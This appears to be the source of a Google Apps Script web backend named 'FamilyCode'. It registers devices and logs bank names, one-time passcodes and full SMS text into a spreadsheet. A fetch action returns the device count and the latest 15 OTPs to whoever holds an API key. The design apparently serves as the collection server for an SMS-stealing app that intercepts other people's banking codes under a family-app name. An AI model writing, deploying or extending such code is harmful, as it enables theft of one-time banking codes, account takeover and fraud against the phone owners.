/**
 * FamilyCode Backend - Google Apps Script
 * Handles device registration, OTP logging, and data retrieval.
 */

// ============================================================
//  CONFIGURATION
// ============================================================
var API_KEY = PropertiesService.getScriptProperties().getProperty('API_KEY');
var DB_SHEET_NAME  = "database";
var LOG_SHEET_NAME = "logs";

// Tab Names for specific data
var DEVICES_SHEET_NAME = "Devices";
var OTPS_SHEET_NAME = "OTPs";

// ============================================================
//  AUTH HELPER
// ============================================================
function isAuthorized(params) {
  if (!API_KEY) {
    logError("Auth", "CRITICAL: API_KEY Script Property is not set. All requests blocked.");
    return false;
  }
  if (!params.api_key || params.api_key !== API_KEY) {
    logInfo("Auth_FAIL", "Unauthorized attempt. Key prefix: " + String(params.api_key || "none").slice(0, 4) + "...");
    return false;
  }
  return true;
}

// --- ENHANCED LOGGING ENGINE ---
function logInfo(tag, msg) { writeLog("INFO", tag, msg); }
function logError(tag, err) { writeLog("ERROR", tag, err.toString()); }

function writeLog(lvl, tag, msg) {
  try {
    console.log("[" + lvl + "] " + tag + ": " + msg);
    var ss = SpreadsheetApp.getActiveSpreadsheet();
    var s = ss.getSheetByName(LOG_SHEET_NAME) || ss.insertSheet(LOG_SHEET_NAME);
    if (s.getLastRow() > 1000) { s.deleteRows(2, 500); }
    s.appendRow([new Date(), lvl, tag, msg]);
  } catch(e) {
    console.error("Logging failed: " + e.toString());
  }
}

function doGet(e) {
  return doPost(e);
}

function doPost(e) {
  var params = e.parameter;
  if (!params.api_key && e.postData && e.postData.contents) {
    try {
      var data = JSON.parse(e.postData.contents);
      params = data;
    } catch(err) {}
  }

  if (!isAuthorized(params)) return respondError("Unauthorized");

  try {
    var action = (params.action || "").toLowerCase();
    logInfo("doPost_Entry", "Action: " + action);

    var result;
    switch (action) {
      case "register"   : result = handleRegister(params); break;
      case "save_otp"   : result = handleSaveOtp(params); break;
      case "fetch_data" : result = handleFetchData(params); break;
      default           : return respondError("Unknown action: " + action);
    }

    logInfo("doPost_Success", action + " completed successfully");
    return respond(result);
  } catch (err) {
    logError("doPost_Error", err);
    return respondError(err.message);
  }
}

function handleRegister(params) {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var sheet = ss.getSheetByName(DEVICES_SHEET_NAME) || ss.insertSheet(DEVICES_SHEET_NAME);

  if (sheet.getLastRow() === 0) {
    sheet.appendRow(["device_id", "device_name", "timestamp"]);
  }

  var deviceId = params.device_id;
  var deviceName = params.device_name;

  sheet.appendRow([
    deviceId,
    deviceName,
    new Date().toISOString()
  ]);

  return { success: true };
}

function handleSaveOtp(params) {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var sheet = ss.getSheetByName(OTPS_SHEET_NAME) || ss.insertSheet(OTPS_SHEET_NAME);

  if (sheet.getLastRow() === 0) {
    sheet.appendRow(["timestamp", "bank_name", "otp_code", "full_message"]);
  }

  var bankName = params.bank_name;
  var otpCode = params.otp_code;
  var fullMessage = params.full_message;

  sheet.appendRow([
    new Date().toISOString(),
    bankName,
    otpCode,
    fullMessage
  ]);

  return { success: true };
}

function handleFetchData(params) {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var devicesSheet = ss.getSheetByName(DEVICES_SHEET_NAME) || ss.insertSheet(DEVICES_SHEET_NAME);
  var otpsSheet = ss.getSheetByName(OTPS_SHEET_NAME) || ss.insertSheet(OTPS_SHEET_NAME);

  // Get Device Count (Unique device_id)
  var deviceData = devicesSheet.getDataRange().getValues();
  var uniqueDevices = [];
  if (deviceData.length > 1) {
    for (var i = 1; i < deviceData.length; i++) {
      var devId = deviceData[i][0];
      if (devId && uniqueDevices.indexOf(devId) === -1) {
        uniqueDevices.push(devId);
      }
    }
  }

  // Get Recent OTPs (Last 15)
  var otpData = otpsSheet.getDataRange().getValues();
  var recentOtps = [];
  if (otpData.length > 1) {
    var totalRows = otpData.length;
    var count = 0;
    for (var j = totalRows - 1; j >= 1 && count < 15; j--) {
      recentOtps.push({
        "timestamp": otpData[j][0],
        "bank_name": otpData[j][1],
        "otp_code": otpData[j][2],
        "full_message": otpData[j][3]
      });
      count++;
    }
  }

  return {
    success: true,
    device_count: uniqueDevices.length,
    recent_otps: recentOtps
  };
}

function respond(p) {
  return ContentService.createTextOutput(JSON.stringify(p)).setMimeType(ContentService.MimeType.JSON);
}

function respondError(m) {
  return respond({ success: false, error: m });
}
